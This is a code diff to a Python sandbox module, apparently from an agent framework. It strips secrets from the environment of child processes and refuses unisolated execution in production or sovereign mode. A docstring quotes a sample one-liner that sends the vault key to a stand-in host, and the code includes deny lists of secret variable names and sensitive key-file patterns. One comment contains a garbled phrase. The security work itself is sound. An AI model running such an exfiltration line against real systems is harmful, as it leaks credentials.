@@ -28,9 +28,22 @@ For genuine OS-level isolation of untrusted code, use the **docker** backend,
 which runs the command inside `docker run --rm --network none` with only the
 workdir bind-mounted at /work.
 
+3. **Secrets are confined regardless of backend.** A sandboxed command does
+   NOT inherit this process's environment. Secret-shaped variables — the vault
+   key, the signing seed, every provider token — are stripped by `_child_env()`
+   before the child starts, so an approved command cannot read a credential it
+   was never granted. `OLYMPUS_EXEC_ENV_PASSTHROUGH` re-admits named variables
+   one at a time when a build genuinely needs one.
+
 Backends (`OLYMPUS_EXEC_BACKEND`):
     local   subprocess started in the workdir (default) — NOT OS-isolated;
-            safety rests on the Action spine approval gate above.
+            safety rests on the Action spine approval gate above plus the
+            environment scrubbing in (3). REFUSED under sovereign or production
+            mode unless `OLYMPUS_EXEC_ALLOW_UNISOLATED=1` (see
+            `_isolation_refusal`), because neither posture's promise survives a
+            bare subprocess with unrestricted network.
+    auto    docker when a daemon is reachable, else local — "isolate if the
+            host can" for deployments that must not hard-fail on a laptop.
     docker  the same command inside `docker run --rm --network none`, the
             workdir bind-mounted at /work — real isolation for untrusted builds.
     daytona remote execution on a Daytona workspace: the cmdguard-checked command
@@ -63,8 +76,131 @@ MAX_TIMEOUT = 600
 OUTPUT_CAP = 20_000
 
 
+_TRUTHY = ("1", "true", "yes", "on")
+
+# Backends that put an OS/host boundary between the command and this process.
+# `local` is deliberately absent: it is a bare subprocess with the invoking
+# user's privileges and network (see the module docstring).
+_ISOLATED_BACKENDS = frozenset({"docker", "daytona"})
+
+_AUTO_BACKEND: list[str | None] = [None]     # memoized `auto` resolution
+
+
+def _docker_available() -> bool:
+    """Whether a docker *daemon* is reachable — not merely whether the binary
+    exists. `auto` must not resolve to a backend that will then fail at run
+    time with 'backend unavailable', so probe the daemon, not the PATH."""
+    try:
+        proc = subprocess.run(["docker", "info"], capture_output=True,
+                              timeout=5)
+        return proc.returncode == 0
+    except (OSError, subprocess.SubprocessError):
+        return False
+
+
 def backend() -> str:
-    return os.environ.get("OLYMPUS_EXEC_BACKEND", "local").strip().lower() or "local"
+    """The resolved execution backend.
+
+    `auto` prefers real isolation when the host can provide it and degrades to
+    `local` when it cannot, so a hardened deployment can ask for "isolate if
+    possible" without every developer laptop failing closed. The probe is
+    memoized: `run()` calls this on every command and spawning `docker info`
+    per command would dominate the cost of short commands."""
+    raw = os.environ.get("OLYMPUS_EXEC_BACKEND", "local").strip().lower() or "local"
+    if raw != "auto":
+        return raw
+    if _AUTO_BACKEND[0] is None:
+        _AUTO_BACKEND[0] = "docker" if _docker_available() else "local"
+    return _AUTO_BACKEND[0]
+
+
+# Variables whose NAME alone disqualifies them from a child process, on top of
+# the shared `security._SECRETISH_ENV` shape. These are the crown jewels: the
+# vault key and the signing seed. Neither has a legitimate use inside a sandbox
+# command, and either one leaking ends the security model.
+_ENV_SECRET_DENY = frozenset({
+    "OLYMPUS_SECRET_KEY",
+    "OLYMPUS_SIGNING_SEED",
+    "OLYMPUS_SIGNING_SEED_FILE",
+})
+
+
+def _child_env() -> dict[str, str]:
+    """The environment a sandboxed command runs with.
+
+    Previously this was `{**os.environ}` — every provider API key, the vault
+    key (`OLYMPUS_SECRET_KEY`) and the signing seed were handed to any command
+    a user approved. Combined with the `local` backend's unrestricted network
+    that made a single approved snippet
+    (`urlopen('http://x/?k=' + os.environ['OLYMPUS_SECRET_KEY'])`) a complete
+    secret-exfiltration primitive, and it contradicted the `sovereign_mode`
+    invariant, which is enforced only on this process's own HTTP paths.
+
+    Secrets are therefore removed by DEFAULT, matched by name against the same
+    `security._SECRETISH_ENV` shape used to screen outbound content, plus the
+    explicit denylist above. Matching on the name (not the value) is deliberate
+    and errs toward over-scrubbing: dropping a spuriously-named variable from a
+    sandbox child costs nothing, while missing one leaks a credential.
+
+    A command that legitimately needs a credential (a build that must
+    `git push`, say) names it in `OLYMPUS_EXEC_ENV_PASSTHROUGH` as a
+    comma-separated allowlist — an explicit, auditable opt-in per variable
+    rather than a blanket inheritance."""
+    from . import security
+
+    allowed = {
+        name.strip() for name in
+        os.environ.get("OLYMPUS_EXEC_ENV_PASSTHROUGH", "").split(",")
+        if name.strip()
+    }
+    env: dict[str, str] = {}
+    for key, value in os.environ.items():
+        if key in allowed:
+            env[key] = value
+            continue
+        if key in _ENV_SECRET_DENY:
+            continue
+        if security._SECRETISH_ENV.search(key):
+            continue
+        env[key] = value
+    env["OLYMPUS_IN_SANDBOX"] = "1"
+    return env
+
+
+def _isolation_refusal(be: str) -> str | None:
+    """Why this backend may not execute here, or None when it may.
+
+    The `local` backend is not an OS sandbox. That is an acceptable trade for a
+    developer running approved commands on their own laptop; it is NOT
+    acceptable for the two postures that make an explicit promise:
+
+    * `sovereign_mode` promises that data leaves only to allowlisted hosts and
+      that forbidden egress fails closed. A bare subprocess has unrestricted
+      network, so honoring that promise while running commands on `local` is
+      impossible — refuse instead of quietly breaking the invariant.
+    * `is_production` refuses to boot on a forgeable signing seed
+      (`witness.require_production_seed`); the same fail-closed reasoning
+      applies to running untrusted-derived commands with no confinement.
+
+    `OLYMPUS_EXEC_ALLOW_UNISOLATED=1` is the deliberate, documented escape
+    hatch for an operator who has confinement at another layer (a dedicated
+    VM, gVisor, a locked-down container) and knows what they are accepting."""
+    if be in _ISOLATED_BACKENDS:
+        return None
+    if os.environ.get("OLYMPUS_EXEC_ALLOW_UNISOLATED", "").strip().lower() in _TRUTHY:
+        return None
+    if config.sovereign_mode():
+        return ("refused: sovereign mode requires an isolated execution "
+                f"backend, but '{be}' runs as a bare subprocess with "
+                "unrestricted network — which would silently void the "
+                "zero-egress invariant. Set OLYMPUS_EXEC_BACKEND=docker (or "
+                "auto), or OLYMPUS_EXEC_ALLOW_UNISOLATED=1 to accept the risk.")
+    if config.is_production():
+        return ("refused: production mode requires an isolated execution "
+                f"backend, but '{be}' provides no OS confinement. Set "
+                "OLYMPUS_EXEC_BACKEND=docker (or auto), or "
+                "OLYMPUS_EXEC_ALLOW_UNISOLATED=1 to accept the risk.")
+    return None
 
 
 def workdir() -> Path:
@@ -398,6 +534,9 @@ def run(command: str, *, timeout: int | None = None,
     timeout = max(1, min(MAX_TIMEOUT, timeout or DEFAULT_TIMEOUT))
     root = _effective_root(root)
     be = (be or backend()).lower()
+    refusal = _isolation_refusal(be)
+    if refusal:
+        return Result(False, 126, refusal)
     if be == "daytona":
         # Remote execution on a Daytona workspace: the command already cleared
         # cmdguard above, so the same fail-closed gate protects the remote box.
@@ -411,7 +550,7 @@ def run(command: str, *, timeout: int | None = None,
             argv, shell=shell, cwd=str(root), text=True,
             stdout=subprocess.PIPE, stderr=subprocess.PIPE,
             start_new_session=(os.name == "posix"),
-            env={**os.environ, "OLYMPUS_IN_SANDBOX": "1"})
+            env=_child_env())
     except FileNotFoundError as err:               # e.g. docker not installed
         return Result(False, 127, f"backend '{be}' unavailable: {err}")
 
@@ -627,7 +766,7 @@ def undo_write(result: dict) -> str:
 # keys over time, and an agent has no business feeding those to a model.
 # Matched CASE-INSENSITIVELY against every path component (".ENV" and
 # "ID_RSA.BAK" are the same secret — the case-sensitive version of this list
-# was an actual Odysseus vulnerability, fixed upstream as #5097).
+# was an actual the surveyed framework vulnerability, fixed upstream as #5097).
 _SENSITIVE_PATTERNS = (
     ".env", ".env.*", "*.pem", "*.key", "*.p12", "*.pfx", "*.jks",
     "*.keystore", "id_rsa*", "id_ed25519*", "id_ecdsa*", "id_dsa*",
